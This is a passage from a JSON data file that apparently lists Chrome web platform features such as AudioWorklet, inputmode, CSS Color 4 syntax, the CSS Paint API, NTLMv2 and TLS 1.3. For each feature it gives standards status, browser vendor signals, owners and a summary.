        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://webaudio.github.io/web-audio-api/#AudioWorklet",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1062849",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "hongchan@chromium.org",
          "rtoy@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 66,
        "blink_components": [
          "Blink>WebAudio"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=469639",
        "intervention": false
      },
      "opera": {
        "android": 53,
        "desktop": 53
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/15812544/",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "The AudioWorklet object allows developers to supply JavaScript to process audio on the rendering thread, supporting custom AudioNodes. This processing mechanism ensures the synchronous execution of the script code with other built-in AudioNodes in the audio graph.\r\n\r\nThis new feature is designed to replace ScriptProcessorNode. ScriptProcessorNode will be deprecated once AudioWorklet is shipped.",
    "id": 4588498229133312,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2017/12/audio-worklet"
      ],
      "samples": [
        "https://googlechromelabs.github.io/web-audio-samples/audio-worklet/"
      ]
    }
  },
  {
    "category": "User input",
    "updated": {
      "when": "2018-06-14 17:21:31.983359",
      "by": "rschoen@google.com"
    },
    "name": "inputmode",
    "comments": "From Chrome 56 onward this worked on form elements, but not content-editable elements. As of Chrome 66 it works it works in both.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://html.spec.whatwg.org/multipage/interaction.html#attr-inputmode",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=746142",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 66
        },
        "owners": [
          "dtapuska@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 66,
        "flag": false,
        "android": 66,
        "bug": "http://crbug.com/244688",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/status/inputmode/?q=inputmode",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Mixed public signals",
          "val": 4
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The inputmode content attribute is an enumerated attribute that specifies what kind of input mechanism would be most helpful for users entering content into the form control or content editable. ",
    "id": 6225984592281600,
    "resources": {
      "docs": [
        "https://groups.google.com/a/chromium.org/forum/#!topic/blink-dev/KjKEZ5Ga3k8"
      ],
      "samples": [
        "http://output.jsbin.com/teselus/1"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-03-14 05:57:53.469230",
      "by": "jmedley@google.com"
    },
    "name": "window.focus() exits HTML5 fullscreen",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Browser Intervention",
          "val": 9,
          "milestone_str": 66
        },
        "owners": [
          "avi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Fullscreen"
        ],
        "desktop": 66,
        "flag": false,
        "bug": "https://crbug.com/800056",
        "intervention": true
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "If a page in fullscreen mode opens a popup and calls window.focus(), that page will exit full screen. This will not occur if the popup receives focus some other way.",
    "id": 5732193850621952,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-02-20 17:26:30.105940",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Block cross-origin <a download>",
    "comments": "Safari and Firefox already implement the desired behavior. Edge tries to mitigate the impact of cross origin downloads by changing the file extension.",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 5
      },
      "spec": "https://html.spec.whatwg.org/multipage/semantics.html#the-a-element",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "jochen@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "blink_components": [
          "Blink>SecurityFeature"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://crbug.com/714373",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "To avoid what is essentially  user-mediated cross-origin information leakage, Blink will start to ignore the presence of the download attribute on anchor elements with cross origin attributes.",
    "id": 4969697975992320,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en/docs/Web/HTML/Element/a"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-01-24 00:11:32.281230",
      "by": "cnardi@chromium.org"
    },
    "name": "CSS Color 4 HSL/HSLA syntax",
    "tags": [
      "hsl",
      "hsla"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-color/#the-hsl-notation",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1295456",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "cnardi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=786139",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/14995939/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=180528",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Update parsing of HSL() and HSLA() to the syntax described in CSS Color 4. The functions were synonymized, along with allowing whitespace to separate the parameters instead of commas, introducing a backslash as a new way to separate the alpha parameter, allowing angles to be specified as the hue, and allowing percent values for the alpha parameter.",
    "id": 5656221012983808,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/color_value"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-01-24 00:11:41.809530",
      "by": "cnardi@chromium.org"
    },
    "name": "CSS Color 4 RGB/RGBA syntax",
    "tags": [
      "rgb",
      "rgba",
      "color"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/css-color/#rgb-functions",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1295456",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "cnardi@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=788707",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/issues/14894262/",
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "url": "https://bugs.webkit.org/show_bug.cgi?id=180209",
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Update parsing of RGB() and RGBA() to the syntax described in CSS Color 4. The functions were synonymized, along with allowing whitespace to separate the channels instead of commas, introducing a backslash as a new way to separate the alpha parameter, and allowing percent values for the alpha parameter.",
    "id": 5124205561511936,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/CSS/color_value"
      ]
    }
  },
  {
    "category": "Houdini",
    "updated": {
      "when": "2018-03-28 19:30:24.984530",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Paint API (Houdini)",
    "tags": [
      "CSS",
      "Houdini",
      "Paint"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 1
      },
      "spec": "https://drafts.css-houdini.org/css-paint-api/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://ishoudinireadyyet.com/",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "xidachen@chromium.org",
          "ikilpatrick@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>Paint"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://crbug.com/578252",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "CSS Paint API defines a new callback which is designed to allow developers to write code which produces a CSS <image> during the paint phase of the rendering engine.\r\n",
    "id": 5685444318593024,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2018/01/paintapi"
      ],
      "samples": [
        "https://github.com/GoogleChrome/houdini-samples/tree/master/paint-worklet"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-12-18 04:33:06.250150",
      "by": "victoriaytsu@google.com"
    },
    "name": "CSS Selectors 4 Pseudo-Class :any-link",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/selectors-4/#the-any-link-pseudo",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "victoriaytsu@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=788265",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The :any-link pseudo-class represents an element that acts as the source anchor of a hyperlink.",
    "id": 5724922840088576,
    "resources": {}
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2018-02-28 18:19:09.104580",
      "by": "jmedley@google.com"
    },
    "name": "CSS Selectors 4 Pseudo-Class :matches()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://drafts.csswg.org/selectors-4/#matches",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Behind a flag",
          "val": 4,
          "milestone_str": 65
        },
        "owners": [
          "victoriaytsu@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "blink_components": [
          "Blink>CSS"
        ],
        "desktop": 65,
        "flag": true,
        "android": 65,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=568705",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The matches-any pseudo-class, :matches(), is a functional pseudo-class taking a selector list as its argument. It represents an element that is represented by its argument.",
    "id": 5445716612743168,
    "resources": {}
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-06-05 20:27:12.553420",
      "by": "ericbidelman@google.com"
    },
    "name": "Feature Policy: control Synchronous XMLHttpRequest",
    "tags": [
      "policy",
      "xhr",
      "synchronous"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Public discussion",
        "val": 5
      },
      "footprint": {
        "val": 2
      },
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "iclelland@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "blink_components": [
          "Blink>FeaturePolicy"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://crbug.com/661283",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Allows developers to selectively enable and disable use of Synchronous XMLHttpRequest requests through the feature policy HTTP header or the <iframe> \"allow\" attribute. The identifier for the feature in policies is \"sync-xhr\". By default, synchronous XHR is allowed in all frames. If developers wish to disable this on any page, they can include a header like:\r\n\r\nFeature-Policy: sync-xhr 'none'\r\n\r\nOr embed content in an frame with sync XHR disabled like:\r\n<iframe src=\"...\" allow=\"sync-xhr 'none'\">",
    "id": 5154875084111872,
    "resources": {
      "docs": [
        "https://xhr.spec.whatwg.org/",
        "https://github.com/whatwg/xhr/pull/177",
        "https://github.com/whatwg/xhr/issue/178"
      ],
      "samples": [
        "https://wpt.fyi/xhr/xmlhttprequest-sync-default-feature-policy.sub.html"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2018-05-04 12:36:32.698410",
      "by": "phistuck@chromium.org"
    },
    "name": "NTLMv2",
    "comments": "",
    "standards": {
      "status": {
        "text": "De-facto standard",
        "val": 1
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://msdn.microsoft.com/en-us/library/cc236621.aspx",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "zentaro@google.com",
          "dskaram@google.com",
          "asanka@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "blink_components": [
          "Blink>Network"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=22532",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Support NTLMv2 authentication. Currently on non-Windows platforms only NTLMv1 is used. ",
    "id": 5726380163596288,
    "resources": {
      "docs": [
        "Official Microsoft Spec - https://msdn.microsoft.com/en-us/library/cc236621.aspx",
        "Detailed Description of V1 vs V2 protocol Differences - https://docs.google.com/document/d/18kQ_TFQns2HZ9KGs4bGDfiiOIRmOhI12oJBttvUlYLY/edit",
        "Additional NTLM Reference - http://davenport.sourceforge.net/ntlm.html",
        "Additional EPA Reference - https://blogs.msdn.microsoft.com/openspecification/2013/03/26/ntlm-and-channel-binding-hash-aka-extended-protection-for-authentication/",
        "Implementation - https://cs.chromium.org/chr"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-06-21 19:07:54.197578",
      "by": "npm@chromium.org"
    },
    "name": "PerformanceObserver takeRecords()",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/performance-timeline/#takerecords-method",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "npm@chromium.org",
          "igrigorik@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PerformanceAPIs"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=799929",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "url": "https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2Fw3c%2Fperformance-timeline%2Fpull%2F98%23issuecomment-356051848&sa=D&sntz=1&usg=AFQjCNGiH2UV5j6egf4wzoGi36CK0is2fg",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "url": "https://www.google.com/url?q=https%3A%2F%2Fgithub.com%2Fw3c%2Fperformance-timeline%2Fpull%2F98%23issuecomment-356130841&sa=D&sntz=1&usg=AFQjCNH5N6AqeEhoy6pCHcI2ciIpTkaUSw",
          "text": "Public support",
          "val": 3
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The takeRecords method returns a copy of the performance entries in the PerformanceObserver’s buffer, and also clears this buffer. This aligns PerformanceObserver with other *Observer implementations, like MutationObserver and IntersectionObservers, which have similar methods.",
    "id": 5176567353311232,
    "resources": {}
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2018-03-13 23:31:48.860860",
      "by": "deadbeef@chromium.org"
    },
    "name": "RTCRtpSender and RTCRtpReceiver extensions to RTCPeerConnection",
    "tags": [
      "webrtc",
      "rtpsender",
      "rtpreceiver",
      "replacetrack"
    ],
    "comments": "addTrack, removeTrack, getSenders, getReceivers are shipped in M64.\r\nFull support of addTrack with zero or multiple streams as well as replaceTrack are in development. ",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://w3c.github.io/webrtc-pc/#rtcpeerconnection-interface-extensions",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "hbos@chromium.org",
          "deadbeef@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "ios": 65,
        "blink_components": [
          "Blink"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "http://crbug.com/700916",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This feature encapsulates the addition of the following methods to RTCPeerConnection:\r\n\r\ngetSenders(),\r\ngetReceivers(),\r\naddTrack(MediaStreamTrack track, MediaStream... streams),\r\nand removeTrack(RTCRtpSender sender).\r\n\r\nThe RTCRtpSender and RTCRtpReceiver objects will initially be limited to supporting the \"track\" attribute, with RTCRtpSender also supporting \"replaceTrack(MediaStreamTrack withTrack)\".",
    "id": 5347809238712320,
    "resources": {}
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-02-14 10:23:20.957770",
      "by": "hbos@chromium.org"
    },
    "name": "RTCRtpSender.replaceTrack",
    "tags": [
      "WebRTC RTCPeerConnection RTCRtpSender replaceTrack MediaStreamTrack"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webrtc-pc/#dom-rtcrtpsender-replacetrack",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.microsoft.com/en-us/microsoft-edge/platform/catalog/?page=1&q=RTCRtpSender",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "hbos@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "blink_components": [
          "Blink>JavaScript>API"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://crbug.com/790007",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "This allows you to seamlessly change which track is being sent without having to renegotiate at the expense of another offer/answer cycle.\r\nFor example, you might want to switch which video to send or to temporarily not send video, without any disruption in audio or at the cost of an RTT delay. It can also be used to control whether or not to send with replaceTrack(null).",
    "id": 5700232381726720,
    "resources": {}
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:20:16.385290",
      "by": "ericbidelman@google.com"
    },
    "name": "Request.destination",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fetch.spec.whatwg.org/#concept-request-destination",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1402892",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "yoav@yoav.ws",
          "yweiss@akamai.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "ios": 65,
        "blink_components": [
          "Blink>Network>FetchAPI"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=520460",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The `Request.destination` getter enables Service Worker code knowledge regarding which type of resource it is fetching.",
    "id": 5629697845100544,
    "resources": {}
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-01-09 18:32:37.565390",
      "by": "ericbidelman@google.com"
    },
    "name": "ServerTiming API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/server-timing/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1413999",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "cvazac@gmail.com",
          "yoav@yoav.ws"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>PerformanceAPIs>ServerTiming"
        ],
        "desktop": 65,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=702760",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Add the PerformanceServerTiming Interface which makes Server-Timing header timing values available to JavaScript running in the browser. \r\n",
    "id": 5695708376072192,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-01-09 12:16:07.168730",
      "by": "yoav@yoav.ws"
    },
    "name": "Support HTMLAnchorElement.relList property",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/text-level-semantics.html#the-a-element",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "bhagirathi.s@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 65,
        "flag": false,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=394770",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The HTMLAnchorElement.relList read-only property reflects the rel attribute. It is a live DOMTokenList containing the set of link types indicating the relationship between the resource represented by the <a> element and the current document.\r\n",
    "id": 5631885325631488,
    "resources": {}
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2018-01-11 16:44:25.820990",
      "by": "jmedley@google.com"
    },
    "name": "Support HTMLAreaElement.relList property",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://html.spec.whatwg.org/multipage/image-maps.html#the-area-element",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 65
        },
        "owners": [
          "bhagirathi.s@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 65,
        "blink_components": [
          "Blink>DOM"
        ],
        "desktop": 65,
        "flag": false,
        "android": 65,
        "bug": "https://bugs.chromium.org/p/chromium/issues/detail?id=394770",
        "intervention": false
      },
      "opera": {
        "android": 52,
        "desktop": 52
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "The HTMLAreaElement.relList read-only property reflects the rel attribute. It is a live DOMTokenList containing the set of link types indicating the relationship between the resource represented by the <area> element and the current document.\r\n",
    "id": 5730134850011136,
    "resources": {}
  },
  {
    "category": "Security",
    "updated": {
      "when": "2018-03-17 16:21:42.583090",
      "by": "ericbidelman@google.com"
    },
    "name": "TLS 1.3",
    "tags": [
      "tls"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://tools.ietf.org/html/draft-ietf-tls-tls13-22",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
